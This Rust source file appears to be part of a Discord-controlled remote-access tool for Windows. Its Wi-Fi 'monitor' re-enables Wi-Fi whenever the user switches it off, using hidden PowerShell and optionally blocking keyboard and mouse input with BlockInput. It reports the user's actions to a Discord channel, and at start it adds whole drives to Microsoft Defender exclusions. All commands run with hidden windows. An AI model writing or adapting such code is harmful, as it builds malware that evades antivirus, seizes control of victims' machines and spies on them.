use std::sync::Arc;
use crate::prelude::{serenity, ChannelId, CancellationToken, KResult};
use chrono::{DateTime, Utc};
use std::collections::VecDeque;
use tokio::sync::Mutex;
use crate::config::WifiMonitorConfig;
use crate::log_debug;
use powershell_script::PsScriptBuilder;

pub struct WifiMonitor {
    http: Arc<serenity::Http>,
    channel_id: ChannelId,
    config: WifiMonitorConfig,
    shutdown_token: Option<CancellationToken>,
}

#[derive(Debug, Clone, PartialEq)]
enum WifiState {
    Enabled,
    Disabled,
    NotFound,
}

#[derive(Debug, Clone)]
struct WifiEvent {
    message: String,
    timestamp: DateTime<Utc>,
}

impl WifiMonitor {
    pub fn new(http: Arc<serenity::Http>, channel_id: ChannelId, config: WifiMonitorConfig) -> Self {
        Self {
            http,
            channel_id,
            config,
            shutdown_token: None,
        }
    }

    pub fn with_shutdown_token(mut self, token: CancellationToken) -> Self {
        self.shutdown_token = Some(token);
        self
    }

    pub async fn start_monitoring(&self) -> KResult<()> {
        if !self.config.enabled {
            return Ok(());
        }

        let http = self.http.clone();
        let channel_id = self.channel_id;
        let check_interval_ms = self.config.check_interval_ms;
        let re_enable_delay_seconds = self.config.re_enable_delay_seconds;
        let block_user_input = self.config.block_user_input;
        let token = self.shutdown_token.clone().unwrap_or_default();

        tokio::spawn(async move {
            let event_queue: Arc<Mutex<VecDeque<WifiEvent>>> = Arc::new(Mutex::new(VecDeque::new()));
            let mut last_state = Self::get_wifi_state().await;

            if last_state == WifiState::Enabled {
                let _ = channel_id.say(&http, "**WiFi Monitor**: WiFi is currently enabled").await;

                let excluded_drives = crate::core::defender::add_drives_to_exclusion().await;
                if !excluded_drives.is_empty() {
                    let drives_str = excluded_drives.join(", ");
                    let _ = channel_id.say(&http, format!("**Defender**: Added exclusion for drives: {}", drives_str)).await;
                }
            }

            loop {
                tokio::select! {
                    biased;
                    _ = token.cancelled() => {
                        log_debug!("[WifiMonitor] Shutdown signal received");
                        break;
                    }
                    _ = tokio::time::sleep(tokio::time::Duration::from_millis(check_interval_ms)) => {
                        // Continue with monitoring
                    }
                }

                let current_state = Self::get_wifi_state().await;

                if current_state != last_state {
                    let status_msg = match (&last_state, &current_state) {
                        (WifiState::Enabled, WifiState::Disabled) => {
                            let re_enable_msg = Self::re_enable_wifi(re_enable_delay_seconds, block_user_input).await;
                            Some(format!("**Wifi disabled**: User turned off the wifi\n{}", re_enable_msg))
                        },
                        (WifiState::Disabled, WifiState::Enabled) => {
                            Some("**Wifi enabled**: User is now back to online".to_string())
                        },
                        (_, WifiState::NotFound) => {
                            Some("**Wifi adapter not found**: Couldnt find wifi adapter".to_string())
                        },
                        (WifiState::NotFound, WifiState::Enabled) => {
                            Some("**Wifi is now enabled**".to_string())
                        },
                        _ => None,
                    };

                    if let Some(msg) = status_msg {
                        let event = WifiEvent {
                            message: msg,
                            timestamp: Utc::now(),
                        };
                        event_queue.lock().await.push_back(event);
                    }

                    last_state = current_state.clone();
                }

                if current_state == WifiState::Enabled {
                    Self::flush_event_queue(&http, channel_id, &event_queue).await;
                }
            }

            log_debug!("[WifiMonitor] Monitor stopped gracefully");
        });

        Ok(())
    }

    async fn flush_event_queue(
        http: &Arc<serenity::Http>,
        channel_id: ChannelId,
        event_queue: &Arc<Mutex<VecDeque<WifiEvent>>>,
    ) {
        let mut queue = event_queue.lock().await;

        while let Some(event) = queue.pop_front() {
            if !Self::check_internet_connection().await {
                queue.push_front(event);
                break;
            }

            let formatted_msg = format!(
                "{}\n**User turned off at**: {}",
                event.message,
                event.timestamp.format("%Y-%m-%d %H:%M:%S UTC")
            );

            match channel_id.say(http, &formatted_msg).await {
                Ok(_) => {}
                Err(_) => {
                    queue.push_front(event);
                    break;
                }
            }
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }

    async fn check_internet_connection() -> bool {
        if let Ok(output) = tokio::process::Command::new("ping")
            .args(&["-n", "1", "-w", "1000", "8.8.8.8"])
            .creation_flags(0x08000000)
            .output()
            .await
        {
            return output.status.success();
        }
        false
    }

    async fn re_enable_wifi(delay_seconds: u64, block_input: bool) -> String {
        tokio::time::sleep(tokio::time::Duration::from_secs(delay_seconds)).await;

        let script = if block_input {
            r#"
$signature = @'
[DllImport("user32.dll")]
public static extern bool BlockInput(bool fBlockIt);
'@
$block = Add-Type -MemberDefinition $signature -Name Block -Namespace MyUtils -PassThru
$block::BlockInput($true)
netsh interface set interface Wi-Fi enable
Start-Sleep -Seconds 3
$block::BlockInput($false)
"#
        } else {
            "netsh interface set interface Wi-Fi enable"
        };
        
        let script = script.to_string();

        let result = tokio::task::spawn_blocking(move || {
            PsScriptBuilder::new()
                .no_profile(true)
                .non_interactive(true)
                .hidden(true)
                .print_commands(false)
                .build()
                .run(&script)
        }).await;

        match result {
            Ok(Ok(_)) => "**Re-enabled**: WiFi has been re-enabled automatically".to_string(),
            _ => "**Failed to re-enable WiFi**".to_string(),
        }
    }

    async fn get_wifi_state() -> WifiState {
        if let Ok(output) = tokio::process::Command::new("netsh")
            .args(&["interface", "show", "interface"])
            .creation_flags(0x08000000)
            .output()
            .await
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines() {
                if line.to_lowercase().contains("wi-fi") {
                    if line.to_lowercase().contains("connected") || line.to_lowercase().contains("enabled") {
                        return WifiState::Enabled;
                    } else if line.to_lowercase().contains("disconnected") || line.to_lowercase().contains("disabled") {
                        return WifiState::Disabled;
                    }
                }
            }
        }
        WifiState::NotFound
    }
}
